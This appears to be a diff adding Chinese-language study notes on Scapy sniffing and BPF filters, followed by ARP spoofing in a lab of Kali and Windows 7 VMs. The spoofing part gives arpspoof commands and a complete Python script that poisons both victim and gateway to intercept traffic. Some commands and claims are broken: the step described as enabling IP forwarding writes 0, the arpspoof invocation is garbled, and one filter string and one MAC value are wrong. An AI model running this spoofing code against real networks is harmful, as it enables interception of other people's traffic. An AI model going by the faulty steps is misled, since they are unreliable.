@@ -1,0 +1,220 @@
+1:网络数据嗅探
+  1.1:编写网络嗅探工具
+    scapy的sniff()函数参数:
+      count                捕获数据包的数量(默认为0,表示无限制)
+      store                是否保存数据包(默认为1)
+      prn                  函数 用在每个捕获到的数据包上,有返回值就会显示(默认为空)
+      iface                表示要使用的网卡或者网卡列表
+    但是直接捕获的话,会捕获到整个网络的通信,导致大量数据堆积.可以采用过滤的方式:
+      伯克利包过滤(BPF):通过比较各个协议层中数据字段数的方法进行过滤
+    下面介绍BPF:
+      BPF的主要特点是使用一种’原语’的方法来 完成对网络数据包的描述
+  		例如使用’host’描述主机 ‘port’描述端口 同时也支持与或非等运算
+  		可以限定地址 协议等
+  		使用这种语法创建的成为BPF表达式 每个表达式包含一个或多个原语
+  		每个原语有3个限定词:
+  		  Type				规定使用名字或数字代表的类型(如host port net)
+  		  Dir					规定流量的方向(如src dst src and dst)
+  		  Proto				用来规定匹配的协议(如ip,tcp,arp等)
+    举例说明:  
+        host 192.0.0.1            用来过滤除本机和192.0.0.1以外的所有流量
+        host 192.0.0.1&&tcp       只捕获TCP类型的流量
+    常见的过滤器:
+        host 192.0.0.1                  只捕获与网络中某一主机进行交互的流量
+        ether host 00-1a-a0-52-e2-a0    只捕获与网络中某一个MAC地址的主机交互的流量
+        src host 192.0.0.1              只捕获来自网络中某一IP的流量
+        dst host 192.0.0.1              只捕获去往网络中某一IP的流量
+        port 23                         只捕获端口23的流量
+        !23                             捕获除了23端口外的所有流量
+        dst port 80                     只捕获目标端口为80的流量
+        icmp                            只捕获ICMP流量
+        icmp[0]=3&&icmp[1]=0            捕获ICMP的type为3code为0的流量
+    如果希望即时显示捕获的数据包:
+      设置prn=lambda x:x,summary()
+    设置回调函数: 
+      def callback(packet):
+          packet.show()
+      sniff(prn=callback)
+    保存捕获的数据包:
+      wrpcap('demo.pcap',packet)
+    示例:
+      python:  
+        from scapy.utils import wrpcap
+        from scapy.sendrecv import sniff
+        ip = '192.0.0.1'
+        def callback(packet):
+            packet.show()
+            
+        if __name__ == '__main__':
+            packets = sniff(filter='host'+ip,prn=callback,count=5)
+            wrpcap('catch.pcap',packets)
+  1.2:使用wireshark查看数据包:
+      首先要有数据包:
+        使用scapy产生数据包:
+          packets = IP(dst='192.0.0.1')/ICMP()
+        然后使用wireshark打开:
+          wireshark(packets)
+        就可以看到发送的数据包了.
+
+2:ARP欺骗
+  2.1:ARP的原理和缺陷
+      以太网中的设备交换机不能识别IP地址,只能识别硬件地址,交换机中维护着一个内容可寻址寄存器CAM
+      交换机每一个端口所连接设备的硬件地址如下所示:
+      	Mac Address					ports
+      	11:11:11:11:11:11				Fa0/1
+      	22:22:22:22:22:22				Fa0/2
+      	当交换机收到一个发往特定硬件地址的数据包时,首先查找CAM表中是否有对应的表项,
+        如果有就发送到这个端口但是软件使用的是IP地址 硬件使用的是MAC地址 这个过程发生了地址转换
+      这时ARP就出现了:
+        每一台支持ARP的主机里有ARP表,表中存放了已知IP地址与硬件地址的对应关系
+      	在终端输入 arp -a 即可查看.
+      	如果通信目标在表中 就会获取目标的硬件地址 添加到数据包中 交给交换机
+      	如果通信目标不再表中 主机发送一个ARP请求发送到网段所有设备
+      	不过只有目标主机会给出回应 把发送ARP请求的主机的信息放到表中
+      	同时回应给原主机IP 和MAC
+      但是问题出现了:此过程目标主机没有对ARP数据包进行真伪判断
+                    无论是否真正来自于原主机IP 都会添加到ARP表中
+  2.2:ARP欺骗原理
+      现在演示ARP的所需配置:
+        kali虚拟机:
+          IP地址:192.168.209.128
+          硬件地址:00:0c:29:87:eb:ba
+          网关:192.168.209.2(虚拟机终端输入 ip route show 第一个即可)
+        要欺骗的目标主机:windows7虚拟机:
+          IP地址:192.168.209.141
+          硬件地址:00:0c:29:04:95:36(在命令行输入ipconfig /all)
+          网关:192.168.209.2
+        网关配置:
+          IP地址:192.168.209.2
+          硬件地址:00:50:56:fe:e5:f8(在windows7虚拟机中输入arp -a)
+      原理:
+        现在只需要设法将目标主机的ARP表中的192.168.209.2的表项修改即可
+        将网关的MAC修改为主机的MAC
+        因为ARP中规定，主机收到一个ARP请求之后，不会判断这个请求的真伪，
+        直接将请求中的IP地址和硬件地址添加到ARP表中。
+        如果之前有了相同IP地址的表项，就对其修改，这种方式被称为动态ARP表。
+      kali中有现成的工具来实现ARP欺骗:
+            arpspoof
+          sudo apt-get install arpspoof
+        进入arpspoof:
+          sudo arpspoof
+        使用方法:
+          arpspoof [-i 指定使用的网卡] [-t 要欺骗的目标主机] [-r] [要伪装的主机]
+        下面在windows7靶机上演示:
+          配置上文中已经提到,在终端输入:
+            arpspoof -l eth0  -t  -t 192.168.209.141 192.168.209.2
+          可以在wireshark中查看数据包:
+            kali中进入wireshark后,选择eth0过滤非arp包(!arp)
+            即可查看数据包
+        最后在攻击后需要在主机上开启转发功能(使被攻击的主机无法察觉):
+          sudo -i
+          echo 0>>/proc/sys/net/ipv4/ip_forward
+2.3:中间人欺骗
+    使用python实现arp欺骗需要构造如下数据包:
+        192.168.209.2							    源IP地址(即网关IP地址)
+      	00:0c:29:87:eb:ba							源硬件地址(kali虚拟机地址)
+      	192.168.209.141							  目标IP地址
+      	00:0c:29:04:95:36							目标硬件地址
+      	Request									      ARP类型
+    可以在kali中进入scapy后输入ls(arp)查看数据包格式:
+        需要设置的主要有:
+          op                          对应ARP类型(默认为1,无需修改)
+          psrc                        对应源地址IP(192.168.209.2)
+          pdst                        对应目标主机IP(192.168.209.141)
+        还需要使用Ether层将这个数据包发送出去:
+          dst                          目标硬件地址
+          src                          源硬件地址
+
+  2.3.1:scapy实现:
+      gatewayIP='192.168.209.2'
+      gatewayMAC='00:0c:29:87:eb:ba'
+      victimIP='192.168.209.141'
+      victimMAC='00:0c:29:04:95:36'
+      sendp(Ether(dst=victimMAC,src=gateMAC)/ARP(psrc=gatewayIP,pdst=victimIP))
+  2.3.2:python实现:
+      from scapy.all import *
+      from time import sleep
+      def send_packet(packet):
+          while True:
+              sendp(packet,timeout=10)
+              sleep(5)
+              packet.show()
+      if __name__ == '__main__':
+          victimIP='192.168.209.141'
+          gatewayIP='192.168.209.2'
+          victimMAC='00:0c:29:04:95:36'
+          gatewayMAC='00:0c:29:87:eb:ba'
+          packet = Ether(src=gatewayMAC,dst=victimMAC)/ARP(psrc=gatewayIP,pdst=victimIP)
+2.3:在ARP欺骗中加入嗅探功能
+    2.3.1:
+        scapy中有getmacip()函数,作用是给出指定IP地址主机的硬件地址
+        如果要进行中间人欺骗,需要对目标主机和网关进行欺骗
+      用来欺骗目标主机的数据包如下:
+        attackTarget=Ether()/ARP(psrc=gatewayIP,pdst=victimIP)
+      用来欺骗网关的数据包如下: 
+        attackGateway=Ether()/ARP(psrc=victimIP,pdst=gatewayIP)
+    2.3.2:
+      由于ARP表中的表项有生命周期,因此需要不断对目标进行欺骗,可以通过循环实现:
+      sendp()函数本身就有循环发送的功能:
+        inter                      指定间隔时间
+        loop=1                     实现循环发送
+      例如:
+            sendp(attackTarget,inter=1,loop=1)
+    2.3.3:python实现:
+      from scapy.all import *
+      import time
+      def get_mac(ip, interface="eth0"):
+          """通过 ARP 请求获取目标 IP 的 MAC 地址"""
+          ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=3, iface=interface, verbose=0)
+          if ans:
+              return ans[0][1].hwsrc
+          else:
+              raise ValueError(f"无法解析 {ip} 的 MAC 地址")
+      def arp_spoof(victim_ip, gateway_ip, interface="eth0"):
+          # 获取目标 MAC 地址
+          victim_mac = get_mac(victim_ip, interface)
+          gateway_mac = get_mac(gateway_ip, interface)
+      
+          # 获取攻击者 MAC 地址
+          attacker_mac = get_if_hwaddr(interface)
+      
+          # 构造欺骗包：告诉受害者，网关的 MAC 是攻击者的 MAC
+          arp_to_victim = Ether(src=attacker_mac, dst=victim_mac) / ARP(
+              op=2,  # ARP 响应
+              hwsrc=attacker_mac,
+              psrc=gateway_ip,
+              hwdst=victim_mac,
+              pdst=victim_ip
+          )
+      
+          # 构造欺骗包：告诉网关，受害者的 MAC 是攻击者的 MAC
+          arp_to_gateway = Ether(src=attacker_mac, dst=gateway_mac) / ARP(
+              op=2,  # ARP 响应
+              hwsrc=attacker_mac,
+              psrc=victim_ip,
+              hwdst=gateway_mac,
+              pdst=gateway_ip
+          )
+      
+          # 持续发送双向欺骗包
+          while True:
+              sendp([arp_to_victim, arp_to_gateway], iface=interface, verbose=0)
+              time.sleep(2)
+      
+      
+      if __name__ == '__main__':
+          # 配置参数（需替换为实际值）
+          TARGET_IP = "192.168.209.141"
+          GATEWAY_IP = "192.168.209.2"
+          INTERFACE = "eth0"  # 使用的网卡
+      
+          # 启动 ARP 欺骗
+          arp_spoof(TARGET_IP, GATEWAY_IP, INTERFACE)
+    2.3.4:ARP欺骗还可以使用socket来实现,这里不多赘述
+
+
+  
+
+
+
+
